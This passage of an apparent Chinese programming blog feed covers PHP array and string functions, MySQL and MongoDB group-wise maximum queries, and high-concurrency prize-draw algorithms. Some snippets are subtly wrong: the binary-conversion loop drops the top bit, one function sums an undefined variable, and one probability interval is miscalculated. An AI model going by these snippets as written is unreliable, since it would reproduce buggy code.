&lt;h2 id=&quot;二维或者多维数组数据处理有什么技巧&quot;&gt;二维或者多维数组数据处理有什么技巧？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;    $grade = array(&quot;score&quot; =&amp;gt; array(70, 95, 70.0, 60, &quot;70&quot;),
                   &quot;name&quot; =&amp;gt; array(&quot;Zhang San&quot;, &quot;Li Si&quot;, &quot;Wang Wu&quot;,
                                   &quot;Zhao Liu&quot;, &quot;Liu Qi&quot;));
    array_multisort($grade[&quot;score&quot;], SORT_NUMERIC, SORT_DESC,
                    // 将分数作为数值，由高到低排序
                    $grade[&quot;name&quot;], SORT_STRING, SORT_ASC);
                    // 将名字作为字符串，由小到大排序
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;$data[] = array('volume' =&amp;gt; 67, 'edition' =&amp;gt; 2);
$data[] = array('volume' =&amp;gt; 86, 'edition' =&amp;gt; 1);
$data[] = array('volume' =&amp;gt; 85, 'edition' =&amp;gt; 6);
$data[] = array('volume' =&amp;gt; 98, 'edition' =&amp;gt; 2);
$data[] = array('volume' =&amp;gt; 86, 'edition' =&amp;gt; 6);
$data[] = array('volume' =&amp;gt; 67, 'edition' =&amp;gt; 7);

$volume  = array_column($data, 'volume');
$edition = array_column($data, 'edition');

array_multisort($volume, SORT_DESC, $edition, SORT_ASC, $data);
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组元素插入和移除&quot;&gt;数组元素插入和移除&lt;/h1&gt;

&lt;h2 id=&quot;如何往php数组中任意位置加入元素&quot;&gt;如何往PHP数组中任意位置加入元素？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;array_splice — 把数组中的一部分去掉并用其它值取代。把 input 数组中由 offset 和 length 指定的单元去掉，如果提供了 replacement 参数，则用其中的单元取代。注意 input 中的数字键名不被保留。
&lt;code&gt;array_splice($array, 1, 0, array('Python', 'JAVASCRIPT'));&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;array_slice — 从数组中取出一段&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;php数组元素的过滤和移除有哪些方法可以实现&quot;&gt;PHP数组元素的过滤和移除有哪些方法可以实现？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;array_filter — 用回调函数过滤数组中的单元&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;array array_filter ( array $input [, callable $callback = “” ] )&lt;br /&gt;
依次将 input 数组中的每个值传递到 callback 函数。如果 callback 函数返回 TRUE，则 input 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组的排序和对比&quot;&gt;数组的排序和对比&lt;/h1&gt;

&lt;h2 id=&quot;如何巧妙记忆php数组中的排序函数&quot;&gt;如何巧妙记忆PHP数组中的排序函数？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;sort() - 以升序对数组排序&lt;/li&gt;
  &lt;li&gt;rsort() - 以降序对数组排序&lt;/li&gt;
  &lt;li&gt;asort() - 根据值，以升序对关联数组进行排序&lt;/li&gt;
  &lt;li&gt;ksort() - 根据键，以升序对关联数组进行排序&lt;/li&gt;
  &lt;li&gt;arsort() - 根据值，以降序对关联数组进行排序&lt;/li&gt;
  &lt;li&gt;krsort() - 根据键，以降序对关联数组进行排序&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何运用array_multisort函数&quot;&gt;如何运用&lt;code&gt;array_multisort&lt;/code&gt;函数？&lt;/h2&gt;

&lt;h2 id=&quot;如何对php多维数组和对象数组排序&quot;&gt;如何对PHP多维数组和对象数组排序？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;数组和数据结构&quot;&gt;数组和数据结构&lt;/h1&gt;

&lt;h2 id=&quot;php数组能够实现哪些数据结构&quot;&gt;PHP数组能够实现哪些数据结构？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;堆&lt;/li&gt;
  &lt;li&gt;栈&lt;/li&gt;
  &lt;li&gt;队列&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;php数组如何进行集合相关的运算&quot;&gt;PHP数组如何进行集合相关的运算？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;array_merge 合并一个或多个数组&lt;br /&gt;
array array_merge ( array $array1 [, array $… ] )&lt;br /&gt;
array_merge() 将一个或多个数组的单元合并起来，一个数组中的值附加在前一个数组的后面。返回作为结果的数组。
如果输入的数组中有相同的字符串键名，则该键名后面的值将覆盖前一个值。然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。
如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。&lt;/li&gt;
  &lt;li&gt;array_chunk — 将一个数组分割成多个&lt;br /&gt;
array array_chunk ( array $input , int $size [, bool $preserve_keys = false ] )&lt;br /&gt;
将一个数组分割成多个数组，其中每个数组的单元数目由 size 决定。最后一个数组的单元数目可能会少于 size 个。&lt;/li&gt;
  &lt;li&gt;array_diff 计算数组的差集&lt;br /&gt;
array array_diff ( array $array1 , array $array2 [, array $… ] )&lt;br /&gt;
对比返回在 array1 中但是不在 array2 及任何其它参数数组中的值。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;巧妙实现遍历子集&quot;&gt;巧妙实现遍历子集&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;array_map(function($value) {}, $array);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php数组如何实现堆栈&quot;&gt;PHP数组如何实现堆栈？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;堆 &lt;code&gt;SplHeap&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;栈 &lt;code&gt;SplStack&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;用堆栈解决10进制转换为2进制数&quot;&gt;用堆栈解决10进制转换为2进制数&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;$n = 254;
$a = [];
while($n &amp;gt; 1) {
	$a[] = $n % 2;
	$n &amp;gt;&amp;gt;= 1;
}
echo implode('', array_reverse($a));
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用队列的方式解决目录遍历&quot;&gt;使用队列的方式解决目录遍历&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;递归调用&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function recursiveDirectory($dir) {
	if (is_dir($dir) &amp;amp;&amp;amp; $db = opendir($dir)) {
		while ($file = readdir($db)) {
			$path = $dir . '/' . $file;
			if (in_array($file, array('.', '..'))) {
				$files[] = $file;
				continue;
			} elseif (is_dir($path)) {
				RecursiveDirectory($path);
			} elseif (is_file($path)) {
			}
		}	
		closedir($db);
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;使用队列&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function queueDirectory($dir) {
	$queue = array('');
	while (($file = array_shift($queue)) !== null) {
		$path = join(DIRECTORY_SEPARATOR, array($dir, $file));
		if (in_array($file, array('.', '..'))) {
			$files[] = $file;
			continue;
		} elseif (is_dir($path) &amp;amp;&amp;amp; $dh = opendir($path)) {
			while ($file = readdir($dh)) {
				$queue[] = $file;
			}
			closedir($dh);
		} elseif (is_file($path)) {
		}
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;使用SPL&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST);
foreach($objects as $name =&amp;gt; $object){
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;约瑟夫环问题&quot;&gt;“约瑟夫环”问题&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;function josephus($n, $m) {
    $i = 1;
    while (count($n) &amp;gt; 1) {
        foreach ($n as $k =&amp;gt; $v) {
            if ($i++ == $m) {
                unset($n[$k]);
                $i = 1;
            }
        }
    }

    return array_pop($n);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;function josephus($total, $index) {
    $result = 0;
    for($i=2; $i&amp;lt;= $total; $i++) {
        $result = ($result + $index) % $i;
    }
    $num = $result + 1;
    
    return $num;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.laruence.com/2009/08/23/1065.html&quot;&gt;深入理解PHP之数组(遍历顺序)&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2008/11/20/630.html&quot;&gt;深入理解PHP原理之foreach&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.php-internals.com/book/&quot;&gt;深入理解PHP内核&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.phpbench.com/&quot;&gt;The PHP Benchmark&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://sheriframadan.com/2012/10/a-closer-look-into-php-arrays/&quot;&gt;A Closer Look Into PHP Arrays: What You Don’t See&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.laruence.com/2008/09/19/520.html&quot;&gt;深入理解PHP原理之变量分离/引用(Variables Separation)&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>分组聚合实现与优化</title>
   <link href="http://yanpeipan.github.io/2014/12/11/%E5%88%86%E7%BB%84%E8%81%9A%E5%90%88%E5%AE%9E%E7%8E%B0%E4%B8%8E%E4%BC%98%E5%8C%96.html"/>
   <updated>2014-12-11T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/11/分组聚合实现与优化</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;一个通用问题&quot;&gt;一个通用问题&lt;/h1&gt;

&lt;p&gt;如何查找所有频道正在播出的节目？ 如何查找所有分类下最热门的内容？ 如何查找所有运动员的最好成绩？&lt;br /&gt;
这些问题都可以抽象为：如何取分组的最值？&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;sql&quot;&gt;SQL&lt;/h1&gt;

&lt;p&gt;数据库：MySQL&lt;/p&gt;

&lt;h2 id=&quot;基于sql的几种实现&quot;&gt;基于SQL的几种实现&lt;/h2&gt;

&lt;p&gt;任务：为每件物品找到标价最高的经销商&lt;/p&gt;

&lt;h3 id=&quot;关联子查询&quot;&gt;关联子查询&lt;/h3&gt;

&lt;p&gt;最好理解， 一般情况下，应该避免子查询，效率非常低。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT article, dealer, price
FROM   shop s1
WHERE  price=(SELECT MAX(s2.price)
              FROM shop s2
              WHERE s1.article = s2.article);
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;非关联子查询&quot;&gt;非关联子查询&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;SELECT s1.article, dealer, s1.price
FROM shop s1
JOIN (
  SELECT article, MAX(price) AS price
  FROM shop
  GROUP BY article) AS s2
  ON s1.article = s2.article AND s1.price = s2.price;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;左关联&quot;&gt;左关联&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;SELECT s1.article, s1.dealer, s1.price
FROM shop s1
LEFT JOIN shop s2 ON s1.article = s2.article AND s1.price &amp;lt; s2.price
WHERE s2.article IS NULL;
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;名词解释&quot;&gt;名词解释&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;B+树
B+树是一种经典的数据结构，由平衡树和二叉查找树结合产生，它是为磁盘或其它直接存取辅助设备而设计的一种平衡查找树，在B+树中，所有的记录节点都是按键值大小顺序存放在同一层的叶节点中，叶节点间用指针相连，构成双向循环链表，非叶节点（根节点、枝节点）只存放键值，不存放实际数据。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;覆盖索引
包含所有满足查询需要的数据的索引成为覆盖索引(Covering Index)。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;松散索引扫描
当 MySQL 完全利用索引扫描来实现 &lt;code&gt;GROUP BY&lt;/code&gt; 的时候，并不需要扫描所有满足条件的索引键即可完成操作得出结果。&lt;br /&gt;
要利用到松散索引扫描实现GROUP BY，需要至少满足以下几个条件：
    &lt;ol&gt;
      &lt;li&gt;GROUP BY 条件字段必须在同一个索引中最前面的连续位置；&lt;/li&gt;
      &lt;li&gt;在使用GROUP BY 的同时，只能使用MAX 和MIN 这两个聚合函数；&lt;/li&gt;
      &lt;li&gt;如果引用到了该索引中GROUP BY 条件之外的字段条件的时候，必须以常量形式存在；&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;紧凑索引扫描
紧凑索引扫描实现GROUP BY 和松散索引扫描的区别主要在于他需要在扫描索引的时候，读取所有满足条件的索引键，然后再根据读取的数据来完成GROUP BY 操作得到相应结果。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;实例优化&quot;&gt;实例优化&lt;/h2&gt;

&lt;h3 id=&quot;查找所有频道正在播出的节目&quot;&gt;查找所有频道正在播出的节目&lt;/h3&gt;

&lt;p&gt;表结构：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CREATE TABLE `pt_l_program` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `lid` int(11) unsigned NOT NULL COMMENT '频道ID',
  `starttime` timestamp DEFAULT '0' COMMENT '节目开始时间',
  `program` varchar(255) DEFAULT '' COMMENT '节目单',
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique` (`lid`,`starttime`),
) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 COMMENT='节目单';
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SQL：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;select SQL_SMALL_RESULT SQL_NO_CACHE  p1.id, p1.program, p1.starttime, p1.lid  from pt_l_program p1 inner join 
(select  max(starttime) as starttime,lid from pt_l_program where starttime&amp;lt;=UNIX_TIMESTAMP()  group by lid order by null) p2 
on p1.lid=p2.lid and p1.starttime=p2.starttime;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;索引：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CREATE  INDEX Group_Search ON pt_l_program (lid,starttime,id,program);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Explain:&lt;br /&gt;
分组时使用松散索引扫描，聚合数据时使用覆盖索引，完全避免了磁盘IO。如果需要考虑插入性能，则可以去掉&lt;code&gt;Group_Search&lt;/code&gt;。
&lt;img src=&quot;/assets/image/20141214001406.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;问题扩展&quot;&gt;问题扩展&lt;/h2&gt;

&lt;h3 id=&quot;分组取前n条值分组取第n条值&quot;&gt;分组取前n条值/分组取第n条值&lt;/h3&gt;

&lt;p&gt;问题有点难度，但SQL还是可以实现：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set @num :=0, @lid := '';
select id, program,from_unixtime( starttime),channel_id  from (
	select id, program,starttime,
      @num := if(@lid = lid, @num + 1, 1) as row_number,
      @lid := lid as channel_id
  from pt_l_program
	where   starttime&amp;lt;=unix_timestamp()
  order by lid, starttime desc 
) as p where p.row_number &amp;lt;= 2;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用Having过滤：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;set @num :=0, @lid := '', @now := 0;
desc select id, program,from_unixtime(starttime),
      @num := if(@lid = lid and @now&amp;lt;starttime, @num + 1, 1) as row_number,
      @lid := lid as channel_id
from pt_l_program
where starttime&amp;lt;=unix_timestamp() group by lid, starttime desc having row_number&amp;lt;=2;
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;nosql&quot;&gt;NoSQL&lt;/h1&gt;

&lt;p&gt;数据库：MongoDB&lt;/p&gt;

&lt;h2 id=&quot;名词解释-1&quot;&gt;名词解释&lt;/h2&gt;

&lt;p&gt;聚合管道：管道是MongoDB2.2版本引入新的功能 ，它是数据聚合的一个新框架，其概念类似于数据处理的管道。&lt;/p&gt;

&lt;h2 id=&quot;导入数据&quot;&gt;导入数据&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;mongoimport --type csv --file ~/program.csv --db pt --collection program --fields id,lid,starttime,program
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;聚合&quot;&gt;聚合&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;db.program.aggregate(
[
{$match:{}},
{ $project : { id : 1 , lid : 1, program:1, starttime:{$multiply:[&quot;$starttime&quot;, 1000]} } },
{$sort:{&quot;lid&quot;:-1, &quot;starttime&quot;:1}},
{$group : { _id :&quot;$lid&quot;, program:{$first:&quot;$program&quot;}, starttime:{$first:&quot;$starttime&quot;  }}}
],
{explain:true}
)
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.xaprb.com/blog/2006/12/07/how-to-select-the-firstleastmax-row-per-group-in-sql/&quot;&gt;How to select the first/least/max row per group in SQL&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.51testing.com/html/52/n-229952.html&quot;&gt;详解MySQL分组查询Group By实现原理&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnmiss.cn/?p=373&quot;&gt;MySQL优化GROUP BY－松散索引扫描与紧凑索引扫描&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.iteedu.com//database/mysql/mysqlmanualcn/optimization/group-by-optimization.php&quot;&gt;MySQL如何优化GROUP BY&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.coder4.com/archives/1344&quot;&gt;松散的索引扫描(Loose index scan)&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/dbanote/article/details/9083109&quot;&gt;[MySQL] 索引与性能（1）- 索引类型&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/Arlen/articles/1751227.html&quot;&gt;MyISAM 索引结构了解 – MyISAM Index Structure&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.codinglabs.org/articles/theory-of-mysql-index.html&quot;&gt;MySQL索引背后的数据结构及算法原理&lt;/a&gt;&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>高并发抽奖</title>
   <link href="http://yanpeipan.github.io/2014/12/08/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%8A%BD%E5%A5%96.html"/>
   <updated>2014-12-08T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/08/高并发抽奖</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;高并发库存防控超量&quot;&gt;高并发库存防控超量&lt;/h1&gt;
&lt;p&gt;在秒杀，抽奖等活动中，避免商品超卖甚至库存变负数的问题。&lt;/p&gt;

&lt;h2 id=&quot;锁&quot;&gt;锁&lt;/h2&gt;
&lt;p&gt;锁是用来做并发最简单的方式，其代价也是最高的&lt;/p&gt;

&lt;h3 id=&quot;数据库锁&quot;&gt;数据库锁&lt;/h3&gt;
&lt;p&gt;通过&lt;code&gt;update&lt;/code&gt;返回值来判断库存:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;update  set number=number-1 where number &amp;gt; 0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;update  set number=if(number&amp;gt;0, number-1, number)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MyISAM 表级锁，大量的更新操作会造成查询操作的阻塞, 可以用存储过程来实现数据一致性&lt;/li&gt;
  &lt;li&gt;InnoDB 多版本行级锁, 更小的锁粒度, 支持更多的并发，同时性能下降很快，支持事物&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;文件锁&quot;&gt;文件锁&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;if (flock($fp, LOCK_EX)) {
    flock($fp, LOCK_UN);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;消息队列&quot;&gt;消息队列&lt;/h2&gt;
&lt;p&gt;把奖品塞到队列里, 按照&lt;code&gt;FIFO&lt;/code&gt;顺序执行&lt;/p&gt;

&lt;h3 id=&quot;beanstalk&quot;&gt;Beanstalk&lt;/h3&gt;
&lt;p&gt;Beanstalk is a simple, fast work queue.&lt;/p&gt;

&lt;h3 id=&quot;redis&quot;&gt;Redis&lt;/h3&gt;
&lt;p&gt;redis的数据类list可以用来实现队列, 左边压入&lt;code&gt;lpush&lt;/code&gt;, 右边弹出&lt;code&gt;rpop&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;memcacheq&quot;&gt;MemcacheQ&lt;/h3&gt;
&lt;p&gt;Simple Queue Service over Memcache&lt;/p&gt;

&lt;h1 id=&quot;抽奖算法&quot;&gt;抽奖算法&lt;/h1&gt;

&lt;h2 id=&quot;逢几中奖&quot;&gt;逢“几”中奖&lt;/h2&gt;
&lt;p&gt;微博转发得奖就常常使用这种算法，即根据转发次数来决定奖品归属，透明而且具有激励性。&lt;/p&gt;

&lt;h3 id=&quot;基本算法&quot;&gt;基本算法&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;“几”=(抽奖人数/奖品数)*第几个奖品+特定数, 如果是实时抽奖, 则需要预估抽奖人数和奖品数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;美团抽奖&quot;&gt;美团抽奖&lt;/h2&gt;
&lt;p&gt;依赖开奖日&lt;code&gt;收盘时的上证指数&lt;/code&gt; &amp;amp; &lt;code&gt;收盘时的深证成指&lt;/code&gt; 这种不可控的物理随机数A，算法约等为：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;“几”=不可空物理随机数%抽奖人数 + 特定数*第几个奖品&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;概率抽奖&quot;&gt;概率抽奖&lt;/h2&gt;
&lt;p&gt;概率抽奖可以理解为一个转盘，指针最终都会指向某个扇形区域, 触发概率为&lt;code&gt;100%&lt;/code&gt;即&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/9f56a65fgc4e939ac7c35&amp;amp;690.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tp线&quot;&gt;TP线&lt;/h3&gt;
&lt;p&gt;指针最终都会指向扇形的弧上的某一点，因而可以把转盘展开成一条长为周长的线段，命名为TP线（Total probability-Line）。在TP线上随机任取一点。随机取出的这一点出自哪一条线段，则此线段对应的项目被抽中。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;项目&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;概率&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;A&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;B&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;C&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;将项目A, B, C的概率进行求和以作为TP线的总长。用函数random(0,1)*TP线的长度来取TP线上的点。若取得的结果在[0，0.3）时，项目A被抽中；取得的结果在[0.3，0.5）时，项目B被抽中；取得的结果在[0.6，0.9）时，项目C被抽中；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;离散算法&quot;&gt;离散算法&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;function random($prizes) {
  $index = null;
  $probabilitySum = array_sum($prizes);
  $rand = mt_rand(1, $probabilitySum);
  foreach ($prizes as $key =&amp;gt; $probability) {
    if ($rand &amp;lt;= $probability) {
      $index = $key;
      break;
    } else {
      $rand -= $probability;
    }
  }
  return $index;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;优先级算法&quot;&gt;优先级算法&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;function random($prizes) {
  $index = null;
  $probabilitySum = array_sum($prize);
  foreach ($prizes as $key =&amp;gt; $probability) {
    $rand = mt_rand(1, $probabilitySum);
    if ($rand &amp;lt;= $probability) {
      $index = $key;
      break;
    } else {
      $probabilitySum -= $probability;
    }
  }
  return $index;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.guokr.com/question/323304/&quot;&gt;美团网的抽奖是什么原理?&lt;/a&gt;
&lt;a href=&quot;http://blog.sina.com.cn/s/blog_9f56a65f01014v30.html&quot;&gt;如何高效设计游戏——从抽奖模型到圆桌算法（上）&lt;/a&gt;
&lt;a href=&quot;http://blog.sina.com.cn/s/blog_9f56a65f01015npm.html&quot;&gt;如何高效设计游戏——从抽奖模型到圆桌算法（下）&lt;/a&gt;
&lt;a href=&quot;http://www.cnblogs.com/StarOfWorld/archive/2012/02/07/2341050.html&quot;&gt;游戏命中判定：圆桌算法和程序实现&lt;/a&gt;
&lt;a href=&quot;http://www.cnblogs.com/miloyip/archive/2010/04/21/1717109.html&quot;&gt;用JavaScript玩转游戏编程(一)掉宝类型概率&lt;/a&gt;
&lt;a href=&quot;http://www.keithschwarz.com/darts-dice-coins/&quot;&gt;Darts, Dice, and Coins: Sampling from a Discrete Distribution&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.taobaotest.com/blogs/2338&quot;&gt;双11抽奖活动平台测试总结&lt;/a&gt;
&lt;a href=&quot;http://www.searchtb.com/2012/10/introduction_to_disruptor.html&quot;&gt;一种高效无锁内存队列的实现&lt;/a&gt;
&lt;a href=&quot;http://kr.github.io/beanstalkd/&quot;&gt;Beanstalk  is a simple, fast work queue&lt;/a&gt;
&lt;a href=&quot;http://redis.readthedocs.org/en/latest/index.html&quot;&gt;Redis 命令参考&lt;/a&gt;
&lt;a href=&quot;http://www.oschina.net/translate/redis-distlock&quot;&gt;使用 Redis 实现分布式锁&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>玩转PHP字符串</title>
   <link href="http://yanpeipan.github.io/2014/12/07/%E7%8E%A9%E8%BD%ACphp%E5%AD%97%E7%AC%A6%E4%B8%B2.html"/>
   <updated>2014-12-07T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/07/玩转php字符串</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;字符串的表达方式&quot;&gt;字符串的表达方式&lt;/h1&gt;

&lt;h2 id=&quot;字符串的表达方式有哪些各是怎么表达&quot;&gt;字符串的表达方式有哪些，各是怎么表达？&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;单引号&lt;/li&gt;
  &lt;li&gt;双引号&lt;/li&gt;
  &lt;li&gt;heredoc 语法结构&lt;/li&gt;
  &lt;li&gt;nowdoc 语法结构（自 PHP 5.3.0 起）&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;存取和修改字符串中的字符有什么技巧&quot;&gt;存取和修改字符串中的字符有什么技巧？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;string 中的字符可以通过一个从 0 开始的下标，用类似 array 结构中的方括号包含对应的数字来访问和修改，比如 $str[42]。可以把 string 当成字符组成的 array。函数 substr() 和 substr_replace() 可用于操作多于一个字符的情况。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Warning
用超出字符串长度的下标写入将会拉长该字符串并以空格填充。非整数类型下标会被转换成整数。非法下标类型会产生一个 E_NOTICE 级别错误。用负数下标写入字符串时会产生一个 E_NOTICE 级别错误，用负数下标读取字符串时返回空字符串。写入时只用到了赋值字符串的第一个字符。用空字符串赋值则赋给的值是 NULL 字符。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Warning
PHP 的字符串在内部是字节组成的数组。因此用花括号访问或修改字符串对多字节字符集很不安全。仅应对单字节编码例如 ISO-8859-1 的字符串进行此类操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note:
用 [] 或 {} 访问任何其它类型（不包括数组或具有相应接口的对象实现）的变量只会无声地返回 NULL。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;字符串的原理&quot;&gt;字符串的原理&lt;/h1&gt;

